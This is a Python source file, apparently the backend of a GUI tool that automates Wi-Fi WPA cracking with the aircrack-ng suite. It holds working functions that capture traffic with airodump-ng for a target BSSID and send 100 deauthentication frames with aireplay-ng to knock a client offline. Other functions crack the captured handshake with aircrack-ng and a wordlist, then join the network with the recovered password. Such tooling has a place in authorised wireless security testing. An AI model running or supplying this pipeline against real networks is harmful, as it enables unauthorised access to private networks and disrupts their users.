import os
import subprocess
import os
import signal
import sys
import subprocess
from threading import Timer
import pkg_resources
import subprocess
import time                            # sleeping
import sys                             # cli exiting
import pyric                           # pyric error (and ecode EUNDEF)
import pyric.pyw as pyw                # for iw functionality
import pyric.utils.hardware as hw      # for chipset/driver
from pyric.utils.channels import rf2ch # rf to channel conversion
import asyncio
import pyrcrack
import psutil
import tkinter as tk
import time
import shutil
import string
import re

global pid
isOn = False

def connectToWifi(ssid, password, session):

    command = ["sudo", "systemctl", "start", "NetworkManager"]
    p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, r = p.communicate(None)
    session.addLog("Network Manager should be on now")
    time.sleep(5)
    
    command = ["nmcli", "device", "wifi", "connect", ssid, "password", password]
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    result = ""
    for line in iter(p.stdout.readline,""):
        result = result+line+"\n"
    time.sleep(5)
    return result

def crack(svResult, dictionary, path):
    filePath = path+"/target-01.cap"
    command = ["sudo", "aircrack-ng", filePath, "-w", dictionary]#, ">", "crackedPassword.txt"]
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    while True:
        realtimeOutput = p.stdout.readline()

        if(realtimeOutput == "" and p.poll() is not None):
            break
        if(realtimeOutput):
            
            realtimeOutput.strip().replace("\t", "")
            normal_string = re.sub(r'[^a-zA-Z0-9\s]+', '', realtimeOutput)
            svResult.set(svResult.get()+normal_string)
    return p.returncode

async def scanTargets(interface, bssid, session):
    global isOn
    isOn = True
    path = session.path.get()
    filePath = path+"/target"

    channel = session.target.get()
    if channel:
        channel = channel.split()[5].replace(",","")
    else:
        channel = "7"

    command = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, interface, "-w", filePath]
    session.addLog("Executing "+(str(command)))
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    global pid
    pid = p.pid
    return p.returncode


def deauthDevice(interface, bssid, mac, session):
    command = ["sudo", "aireplay-ng", "--deauth", "100", "-c", mac, "-a", bssid, interface]
    session.addLog("Executing "+(str(command)))
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    global pid
    pid = p.pid

    return p.returncode

def updateResults(svScanResult, session):
    path = str(session.path.get())
    global isOn
    if isOn:
        filePath = path+"/target-01.csv"
        #if doesnt exist say to start scan or print no data found
        with open(filePath, mode="r") as f:
            lines = f.readlines()
            session.addLog("read "+str(len(lines))+" lines of AP's scan result")
        svScanResult.set("".join(lines))
        return 0
    else:
        session.addLog("AP's scan is not on, won't read file")
        return -1

def checkKillScan(path):
    global isOn
    if not "isOn" in globals():
        return -1
    if not isOn:
        return -1
    if not pid:
        return -1
    if pid != -1:
        if psutil.pid_exists(pid):
            os.kill(pid, signal.SIGKILL)
            os.rename(path+"/target-01.csv", path+"/target-"+str(time.time())+".csv")
            os.rename(path+"/target-01.cap", path+"/target-"+str(time.time())+".cap")
            os.remove(path+"/target-01.kismet.csv")
            os.remove(path+"/target-01.kismet.netxml")
            os.remove(path+"/target-01.log.csv")
            isOn = False
            return 0
    return -1
